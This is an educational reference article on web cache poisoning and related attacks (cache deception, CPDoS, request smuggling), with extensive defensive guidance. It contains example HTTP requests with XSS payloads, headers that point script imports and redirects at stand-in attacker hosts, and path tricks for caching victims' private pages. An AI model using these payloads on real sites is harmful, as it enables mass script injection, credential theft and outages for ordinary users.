# Web Cache Poisoning

> Web cache poisoning turns a shared cache into an exploit delivery system. A cache decides that two requests are "the same" by comparing only a subset of the request, the cache key (typically method plus path plus query string plus Host). Everything else (most headers, cookies, sometimes the port, sometimes whole query parameters) is unkeyed: it can influence the generated response but is invisible to the cache's equivalence check. If any unkeyed input reaches a response-affecting sink (a reflected value, an imported script URL, a redirect target, a routing decision) and that response is then stored, the attacker sends one request with a poisoned unkeyed input and the cache serves the harmful response to every subsequent user whose keyed components match. The root cause is a discrepancy between what the cache keys on and what the application actually uses to build the response. This class was popularized by James Kettle's 2018 "Practical Web Cache Poisoning" and extended in his 2020 "Web Cache Entanglement".

## How it works

A web cache (Varnish or Nginx on-prem, a CDN like Cloudflare / Akamai / Fastly / CloudFront, or an application-integrated cache like Drupal's) sits between users and the origin. On a request it computes the cache key, looks for a stored response under that key, and either serves the hit or forwards the miss to origin and stores the fresh response for the key's lifetime.

The cache key is the whole game. A typical key covers the request line and Host:

```http
GET /blog/post.php?mobile=1 HTTP/1.1     <- keyed (method, path, query)
Host: example.com                        <- keyed
User-Agent: Mozilla/5.0 ... Firefox/57.0 <- usually unkeyed
Accept-Language: en-US,en;q=0.5          <- unkeyed
Cookie: language=en;                     <- usually unkeyed
X-Forwarded-Host: example.com            <- unkeyed
```

Two requests that differ only in unkeyed components are treated as equivalent, so a response generated for the first is served to the second. That is already an accidental-breakage engine (serve the Polish page to English users because `Cookie: language` is unkeyed). It becomes an attack when the unkeyed input is attacker-chosen and reaches a dangerous sink.

```mermaid
sequenceDiagram
  participant A as Attacker
  participant C as Cache
  participant O as Origin
  participant V as Victim
  A->>C: GET /page with unkeyed header, e.g. X-Forwarded-Host: attacker.com
  C->>C: computes cache key from method, path, Host only, header stays unkeyed
  C->>O: cache miss, forwards full request including unkeyed header
  O->>O: reflects unkeyed header value into response, e.g. Open Graph image URL
  O-->>C: response body contains attacker's reflected payload
  C->>C: stores response under the ordinary key for /page
  C-->>A: returns poisoned response
  V->>C: GET /page, ordinary request, no attacker header
  C-->>V: cache hit, serves the stored poisoned response
```

Response-header mechanics that govern all of this:

- `Cache-Control` (`public`, `private`, `no-store`, `no-cache`, `max-age`) is the origin's caching directive. Crucially it is advisory to the CDN: Kettle poisoned Red Hat despite `Cache-Control: public, no-cache`, because the fronting cache (Akamai) cached anyway. Always test rather than assume a header prevents caching.
- `Vary` lists request headers that should be promoted into the key (commonly `Vary: User-Agent` so mobile pages are not served to desktop). In practice `Vary` is used crudely, and some CDNs (Cloudflare) ignore it outright, so it is an unreliable defense but a useful attacker signal: `Vary: User-Agent` tells you the payload will only hit users with your exact User-Agent, enabling selective targeting.
- `Age` (seconds the response has sat in cache) and `max-age` together tell an attacker the exact second a cache entry expires, so a single well-timed request can re-poison it instead of a noisy request flood.

CDN-specific behavior matters. Akamai supports `Pragma: akamai-x-get-cache-key` which echoes the computed key in `X-Cache-Key`, letting you see the key directly. Cloudflare exposes `CF-Cache-Status` (MISS / HIT / DYNAMIC) and `/cdn-cgi/trace` (shows which regional colo served you, e.g. `colo=AMS`); because CDNs are geographically sharded, you often must poison the specific regional cache your victim uses.

Testing methodology hinges on a cache buster. To probe unkeyed inputs without poisoning real users, give every test request a unique cache key (add a unique query parameter, or in Param Miner add a `$randomplz` value). To then confirm a payload was actually cached, resend the request without the malicious header and fetch the URL from a clean browser: if the payload persists, it is cached.

## Attack techniques

### 1. Reflected unkeyed header into cacheable XSS

The simplest case: an unkeyed header is reflected into HTML without sanitization. `X-Forwarded-Host` is a classic because frameworks and CDNs frequently honor it to build absolute URLs. James Kettle's canonical Red Hat example built an Open Graph image URL from it:

```http
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
...
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

WHY it works: `X-Forwarded-Host` is unkeyed, so the poisoned response is stored under the ordinary key for `/en`, then served to everyone who requests the legitimate URL with no interaction. This converts a header-only reflected XSS (normally useless, because you cannot force another user's cross-domain request to carry a custom header) into a stored, mass-delivery XSS. Header names worth spraying: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, plus obscure ones (`translate`, `bucket`, `path_info`).

### 2. Unsafe resource import (script src hijack)

If an unkeyed header generates a URL for an imported resource (script, stylesheet, JSON), pointing it at attacker infrastructure yields code execution. Kettle's unity3d.com case used `X-Host`:

```http
GET / HTTP/1.1
Host: unity3d.com
X-Host: attacker-labs.net

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
...
<script src="https://attacker-labs.net/sites/files/foo.js"></script>
```

The `Age: 174` and `max-age=1800` pair reveals the entry expires 1626 seconds from now, so a single timed request re-poisons cleanly. DOM-based variants apply to imported JSON: poison the response so JavaScript fetches an attacker-controlled i18n / config file (`{"Show more":"<svg onload=alert(1)>"}`), which a client-side sink then executes. If the poisoned load is cross-origin JSON, serve it with `Access-Control-Allow-Origin: *` so the page can read it. (Real case: `catalog.data.gov` `data-site-root` attribute driving an i18n fetch.)

### 3. Chaining multiple unkeyed inputs into an open redirect

One header often confuses only part of the stack; chain several. A site that redirects HTTP to HTTPS using `X-Forwarded-Scheme`, and generates URLs from `X-Forwarded-Host`, can be combined:

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

`X-Forwarded-Scheme: nothttps` triggers the redirect; `X-Forwarded-Host` sets its destination. Cached, this persistently redirects every visitor of a normal URL to the attacker, enabling credential/CSRF-token theft (redirect a POST) or malware delivery.

### 4. Route poisoning and Open Graph / social hijack

Some stacks use headers for internal routing, not just URL generation. HubSpot honored `X-Forwarded-Server` over `Host`, letting Kettle serve his own HubSpot-hosted page's payload on `goodhire.com`. Open Graph hijack overrides `og:url` via `X-Forwarded-Host` so anyone sharing the page shares attacker content. The Mozilla SHIELD case poisoned Normandy (`normandy.cdn.mozilla.net`) via `X-Forwarded-Host` behind an Nginx cache, redirecting tens of millions of Firefox clients' recipe fetches to attacker infrastructure.

### 5. Exploiting cache-key flaws: unkeyed port and unkeyed query string

Even keyed components get transformed before keying, opening a gap between the keyed value and the value the app sees. Kettle's "Web Cache Entanglement" (Black Hat USA 2020) formalized this. Probe with a cache oracle (a cacheable endpoint that reflects the URL and signals hit/miss). Unkeyed port: some caches strip the port from Host before keying but the app still uses the full header:

```http
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```

A follow-up without the port returns the `:1337` response as a `hit`, proving the port is unkeyed. A dud port becomes a DoS (home page redirects everyone to a dead port until expiry); a non-numeric port can carry XSS. Unkeyed query string: a very common transform is excluding the entire query string from the key. This masks reflected XSS (scanners see only cached responses and think the parameter is inert) and then makes it worse: poison via `?xss=payload` and the payload is served on the clean URL. Because query cache busters are now useless, bust the cache via a keyed header instead:

```http
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

### 6. Cache parameter cloaking (delimiter discrepancies)

When only specific parameters are excluded from the key (analytics params like `utm_content`), a parsing discrepancy between cache and app lets you smuggle a payload into an excluded parameter. If the cache treats any `?` as a parameter delimiter but the origin treats only the first `?` as one:

```http
GET /?example=123?excluded_param=payload
```

The cache sees two params and excludes the second (clean key); the origin sees one param `example` whose value is the entire tail including the payload. The Ruby on Rails variant abuses `;` as an extra delimiter plus last-value-wins:

```http
GET /?keyed_param=abc&excluded_param=123;keyed_param=payload
```

The cache splits on `&` only, keys `keyed_param=abc`, and drops the excluded param; Rails splits on `;` too, sees a duplicate `keyed_param`, and uses the last one (the payload). Powerful against JSONP: override the `callback` function name to execute arbitrary JS while keeping an innocent key.

### 7. Fat GET

If the HTTP method or a method-override is unkeyed, put the payload in a request body on a GET so the key derives from the request line but the app reads the body value:

```http
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST

param=payload
```

The key is `?param=innocent`; the origin uses `param=payload` from the body. Requires the origin to accept bodies on GET (some frameworks do by default).

### 8. Normalized cache keys (resurrecting "unexploitable" XSS)

Reflected XSS is often unexploitable because the victim's browser URL-encodes the payload and the server never decodes it. If the cache normalizes (decodes) the key, then `?param="><test>` and `?param=%22%3e%3ctest%3e` share one key. Poison via Repeater with the raw, unencoded payload; the victim's browser sends the encoded form, which normalizes to the same key, so the cache serves the poisoned unencoded response and the payload executes.

### 9. Cache key injection

If keyed components are concatenated into the key string without escaping the delimiter, you can craft two different requests with the same key. With a `__` delimiter and an `Origin` header folded into the key:

```http
GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
<script>...'-alert(1)-'...</script>
```

The victim visiting `/path?param=123__Origin='-alert(1)-'__` produces the same key and receives the poisoned response. This weaponizes an otherwise-unexploitable client-side bug in a keyed header.

### 10. Internal (fragment) cache poisoning

Application-level caches (Drupal's built-in cache) sometimes cache reusable response fragments with no meaningful key. Poison a fragment used on every page (via a basic `Host`-header trick) and you poison every page for every user with one request. Kettle's Drupal chain combined the internal cache's handling of `X-Original-URL` (which includes the query string in its key) with a Drupal open redirect (`?destination=` bypassed via `//?destination=https://evil.net\@site/`, browsers converting `\` to `/`) to persistently hijack JavaScript imports on business.pinterest.com and to do nested cache poisoning (poison the internal cache, then use it to poison the external cache). Fixed via coordinated disable of `X-Original-URL` / `X-Rewrite-URL` support: Drupal SA-CORE-2018-005, Symfony CVE-2018-14773, Zend ZF2018-01.

### 11. Web cache deception

Web cache deception (Omer Gil, 2017) is the sibling class to poisoning and the one interviewers pair with it. The attacker lures an authenticated victim to a URL like `https://bank.com/account.php/nonexistent.css` (or `.jpg`, `.js`). The origin router treats the path as `/account.php`, ignores the trailing `/nonexistent.css`, and returns the victim's private authenticated HTML. The fronting cache sees a `.css` suffix, matches a static-file rule that caches by extension and disregards `Cache-Control: private`, and stores the private response under the CSS URL. The attacker then fetches the same URL unauthenticated and reads the cached victim data: session tokens, PII, CSRF tokens, whatever the page renders.

Two preconditions must both hold. First, permissive path handling on origin: path parameters in Nginx/Apache, ignored trailing segments, or framework routes that match on prefix. Second, a cache tier that decides cacheability by URL suffix or Content-Type rather than honoring the origin's `Cache-Control`. Variants extend the same idea with delimiter and traversal tricks so both parsers accept the request: `/account.php;x.css`, `/account.php%00.css`, `/account.php%3Bfoo.css`, and `/account.php/..%2fstatic/foo.css` all satisfy an origin that stops at the first delimiter while presenting a static suffix to the cache.

The contrast with poisoning is worth stating cleanly because it is a common interviewer probe. Deception has one victim per URL (the authenticated user the attacker lures), no unkeyed input, and steals private data. Poisoning has many victims per URL, requires an unkeyed sink, and injects attacker content. Defenses converge though: origin should route strictly and reject unknown trailing segments (disable `AcceptPathInfo` in Apache, avoid `try_files $uri` chains that fall through to a script for arbitrary suffixes in Nginx), the cache should honor `Cache-Control: private` and `no-store` and must never cache by extension alone on paths that can be authenticated, and authenticated responses should always carry `Cache-Control: private, no-store` explicitly.

### 12. Cache-Poisoned Denial of Service (CPDoS)

CPDoS (Nguyen et al., 2019) is the DoS-via-poisoning taxonomy interviewers pair with the poisoning-for-XSS chain. All three variants share the same shape: the attacker sends one request that the CDN forwards but the origin rejects with a cacheable error response, the CDN stores that error against a legitimate URL key, and every subsequent user of that URL receives the cached error until eviction.

HTTP Header Oversize (HHO): the attacker sends a request with a header block larger than the origin's limit but under the CDN's limit. The origin returns a 400 Bad Request, the CDN caches it against the legitimate URL, and the page is broken for everyone until it expires. HTTP Method Override (HMO): the attacker sends `GET /path` with `X-HTTP-Method-Override: DELETE` (or `POST`, `PUT`, `TRACE`). The CDN keys the GET; the origin honors the override and returns a 405 or 501 which is then stored under the GET key. HTTP Meta Character (HMC): the attacker injects a control character (`\n`, `\r`, `\a`) into a header the CDN forwards verbatim but the origin rejects, poisoning the URL with the resulting cached error.

Defenses require symmetry across the tiers. Normalize header size limits so the CDN's maximum is less than or equal to the origin's, so any oversized request is rejected at the edge and never reaches origin. Strip method-override headers (`X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method`) at the edge. Reject control characters in header values at the edge before forwarding. Configure the cache to never store 4xx or 5xx responses unless a specific path opts in, and confirm empirically because many CDNs cache selected error codes by default (404 in particular).

### 13. Request smuggling to cache poisoning

The highest-severity real-world chain fuses HTTP request smuggling with cache poisoning, and every candidate should be ready for the follow-up. When the front-end (typically the CDN) and back-end disagree on where one request ends and the next begins (CL.TE, TE.CL, TE.TE, or the H2.CL/H2.TE downgrade desyncs), an attacker prepends a smuggled request that the back-end processes but the front-end does not see as separate. The back-end's response to the smuggled request lands on the socket that the front-end is reusing for the next real user, so that user (and the front-end cache indexing by their URL) receives the smuggled response.

If the front-end then stores that response against the victim's URL key, the smuggled response is served to every subsequent user, poisoning the cache without any unkeyed reflected header at all. This is the payoff step in Kettle's 2019 "HTTP Desync Attacks" and 2021 "HTTP/2: The Sequel is Always Worse": the desync is the primitive, cache poisoning is the amplifier that turns a per-socket attack into a per-URL one. Impact is stored XSS, arbitrary redirect, or arbitrary content at CDN scale against arbitrary victims of the site.

Defenses target both the desync primitive and the amplification. Normalize `Transfer-Encoding` and `Content-Length` at the edge and reject any request that carries both or an ambiguous form of either. Prefer HTTP/2 all the way to origin and reject HTTP/1.1 upstream where the edge speaks HTTP/2, so downgrade desyncs disappear. Disable connection reuse from the front-end to the back-end (fresh TCP or HTTP/2 stream per request) so a smuggled request cannot land against a different user's socket. Where those are not feasible, aggressive header-value validation (reject `Transfer-Encoding` with anything other than `chunked`, reject obfuscated values like `Transfer-Encoding: xchunked`) closes the common variants.

### Detection and confirmation

- Param Miner ("Guess headers" / "Guess parameters") sprays large header/param wordlists and flags inputs that change the response; enable its cache-buster options to avoid poisoning real users.
- Establish a cache oracle and read hit/miss signals (`X-Cache`, `CF-Cache-Status`, `Age`, `Via`, distinct response times). On Akamai, `Pragma: akamai-x-get-cache-key` echoes the key.
- Confirm by resending without the payload header and fetching from a clean browser/machine: persistence proves caching, not just reflection.

Impact spans mass stored XSS, persistent open redirect, script/JSON hijack to full page control, social-media (Open Graph) hijack, mass client misdirection (SHIELD), and denial of service (dud port, cached error, oversized-header 400 cached against a hot URL).

## Defense

1. Do not cache dynamic or authenticated responses. The definitive fix is to disable caching where it is not needed: many sites are only vulnerable because a CDN adopted for DDoS/TLS turned caching on by default. Where caching is required, restrict it to genuinely static responses and be strict about what "static" means (an attacker must not be able to make the origin serve a malicious variant of a static path).
2. Eliminate response-affecting unkeyed inputs. Audit every page with Param Miner to enumerate which headers/cookies/params the app actually reads. If a header (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`, etc.) is not needed, disable it at the edge; frameworks silently supporting it are the recurring root cause.
3. Include every response-affecting input in the cache key, or strip it before it reaches origin. If you exclude something from the key for performance, rewrite (remove) the request component rather than merely ignoring it, so the value the app sees always matches the value the cache keyed.
4. Do not reflect unkeyed input into HTML, resource URLs, redirects, or routing. Client-side vulnerabilities in HTTP headers must be patched even when they look unreachable: a cache quirk can make them reachable.
5. Normalize cache keys consistently and escape delimiters. Ensure the cache and origin parse the URL, query delimiters (`?`, `&`, `;`), port, and encoding identically, so no cloaking, key-injection, or normalization gap exists.
6. Reject fat GET requests and unkeyed method overrides. Do not accept bodies on GET; strip `X-HTTP-Method-Override` at the edge.
7. Know your CDN's key configuration. Understand default key composition, `Vary` handling (Cloudflare ignores it), and whether directives like `no-store`/`private` are actually honored by the cache tier; confirm empirically, do not trust the origin header alone.

## Interview-grade nuances

- The unifying root cause is a discrepancy: the cache keys on X, the app builds the response from Y, and X != Y. Every technique (unkeyed header, unkeyed port, cloaked param, normalized key, key injection) is a specific instance of that gap.
- `Cache-Control: no-cache` and `private` do not guarantee no CDN caching. Kettle poisoned Red Hat through `public, no-cache`. Always verify with a real cross-machine fetch.
- `Vary` is a double-edged sword: it can key `User-Agent` for defense, but it also tells the attacker the key includes `User-Agent`, enabling surgical targeting (one specific victim's UA) or maximizing reach (most-common UA). Cloudflare ignoring `Vary` means it is not a reliable control there.
- Cache poisoning weaponizes bugs that are individually "unexploitable": header-reflected XSS, encoded-only reflected XSS, client-side bugs in keyed headers, dynamic content in resource files. It converts reflected into stored and removes the need to lure the victim to a crafted URL.
- Geo-sharded CDNs mean poisoning is regional. To hit a specific victim (or Facebook's scraper for an Open Graph hijack) you target their colo, discoverable via `/cdn-cgi/trace` on Cloudflare or public multi-region DNS lookups plus a host-header override / a cheap VPS in that region.
- The most common false negative when reproducing: the poison works in Burp but not in an unproxied browser because the requests differ in a keyed part. Two usual culprits: Param Miner's static cache-buster parameter, and `Accept-Encoding` being in the key while Burp rewrote it ("Remove unsupported encodings"). Match the keys and it reproduces.
- When the query string is unkeyed, classic `?cb=` cache busters silently fail (you keep getting hits and think the page is static). Bust via a keyed header (`Accept-Encoding`, `Cookie`, `Origin`) or via path-normalization quirks (`//`, `/%2F`, `/index.php/x`, `/(A(x))/`) that key differently but hit the same origin endpoint.
- Distinguish poisoning from deception cleanly: poisoning uses unkeyed inputs to serve attacker-chosen content to many victims; deception abuses cache rules to store one victim's private response under a URL the attacker fetches. Different key relationship, different victim model.
- Duration of a cache entry does not cap impact: attacks are scripted to re-poison indefinitely, and `Age`/`max-age` let you time a single stealthy re-poison per expiry instead of a detectable flood.
- Internal/fragment caches often have no cache key at all, so a single request poisons every page; they are also the hardest to test safely, so poison only with a domain you control, never `evil-user.net`.

## Sources

- PortSwigger Web Security Academy, Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger, Exploiting cache design flaws: https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- PortSwigger, Exploiting cache implementation flaws: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
- James Kettle, Practical Web Cache Poisoning (2018): https://portswigger.net/research/practical-web-cache-poisoning
- James Kettle, Web Cache Entanglement: Novel Pathways to Poisoning (Black Hat USA 2020): https://portswigger.net/research/web-cache-entanglement
- Drupal SA-CORE-2018-005: https://www.drupal.org/SA-CORE-2018-005
- Symfony CVE-2018-14773 (remove support for legacy X-Original-URL / X-Rewrite-URL): https://symfony.com/blog/cve-2018-14773-remove-support-for-legacy-and-risky-http-headers
- Param Miner extension: https://github.com/PortSwigger/param-miner
- Omer Gil, Web Cache Deception Attack (2017): https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- Hoai Viet Nguyen et al., Your Cache Has Fallen: Cache-Poisoned Denial-of-Service Attack (CCS 2019): https://cpdos.org/
- James Kettle, HTTP Desync Attacks: Request Smuggling Reborn (2019): https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
- James Kettle, HTTP/2: The Sequel is Always Worse (2021): https://portswigger.net/research/http2
